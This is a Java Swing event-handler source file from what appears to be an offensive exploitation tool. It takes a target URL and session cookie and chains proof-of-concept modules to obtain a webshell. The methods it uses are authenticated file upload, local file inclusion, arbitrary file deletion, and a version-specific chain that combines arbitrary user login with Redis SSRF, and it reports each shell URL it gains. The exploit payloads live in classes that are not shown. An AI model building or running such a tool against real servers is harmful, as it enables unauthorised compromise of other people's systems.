package com.xinyu.view;

import com.xinyu.poc.*;
import com.xinyu.tools.Other;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.regex.Pattern;


public class GetShellActionListener implements ActionListener {
    private JTextField field_url; //目标地址
    private JTextField field_cookie; //Cookie
    private JComboBox jcomboBox; //利用方式
    private TextArea textArea; //多行文本框,显示程序运行状态

    public GetShellActionListener(JTextField field_url, JTextField field_cookie, JComboBox jcomboBox, TextArea textArea) {
        this.field_url = field_url;
        this.field_cookie = field_cookie;
        this.jcomboBox = jcomboBox;
        this.textArea = textArea;
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        String url = Other.dataCleaning(this.field_url.getText() + "/", Pattern.compile("(https?://.*?)/"));
        String choose = (String) jcomboBox.getSelectedItem();
        String shell_url = null;
        switch (choose) {
            case "后台上传GetShell":
                System.out.println("后台上传GetShell");
                this.textArea.append("\n*******\n正在尝试利用cookie后台上传文件...");
                String cookie = this.field_cookie.getText();
                if (cookie.contains("PHPSESSID=")) {
                    textArea.append("\n" + cookie);
                    shell_url = getShell(url, cookie);
                    if (shell_url != null) {
                        textArea.append(shell_url);
                    }
                } else {
                    textArea.append("\nCookie格式错误(示例:PHPSESSID=xxx)");
                    textArea.append("\n请点击获取Cookie自动获取或手动填充");
                }

                break;
            case "文件包含GetShell":
                System.out.println("文件包含GetShell");
                this.textArea.append("\n*******\n正在尝试利用本地文件包含漏洞...");
                shell_url = LocalFileIncludes.poc1(url);
                if (shell_url != null) {
                    textArea.append("\n利用成功\nSHELL如下:\n" + shell_url);
                } else {
                    textArea.append("\n利用失败");
                }

                break;
            case "文件删除GetShell":
                System.out.println("文件删除GetShell");
                textArea.append("\n*******\n正在尝试利用任意文件删除漏洞...");
                shell_url = ArbitraryFileDeletion.poc1(url, this.textArea);
                if (shell_url != null) {
                    textArea.append("\n利用成功\nSHELL如下:\n" + shell_url);
                } else {
                    textArea.append("\n利用失败");
                }
                break;
            case "V11.7_GetShell":
                System.out.println("V11.7_GetShell");
                textArea.append("\n*******\n正在尝试V11.7_GetShell...");
                String cookie2 = ArbitraryUserLogin.poc5(url);
                if (cookie2 != null) {
                    shell_url = RedisSSRF.poc1(url, cookie2);
                    if (shell_url != null) {
                        textArea.append("\n利用成功\nSHELL如下:\n" + shell_url);
                    } else {
                        textArea.append("\n利用失败");
                    }
                } else {
                    textArea.append("\n系统当前无在线用户, 未获取到有效Cookie, 利用失败");
                }
                break;
            default:
                System.out.println("未知选项...");
        }
    }


    /**
     * 后台getshell的三中方式
     *
     * @param session
     * @return
     */
    public String getShell(String url, String session) {
        String[] pocArray = {"poc1", "poc2", "poc3"};
        String shell = null;
        textArea.append("\n正在尝试进行getshell...");
        int i = 0;
        do {
            System.out.println("i=" + i);
            shell = GetShell.getShell(url, pocArray[i], session);
            if (shell == null) {
                textArea.append("\n" + pocArray[i] + "利用失败");
            } else {
                textArea.append("\n" + pocArray[i] + "利用成功\nSHELL如下:\n");
            }
            i++;
        } while ((shell == null) && (i < pocArray.length));
        return shell;
    }
}
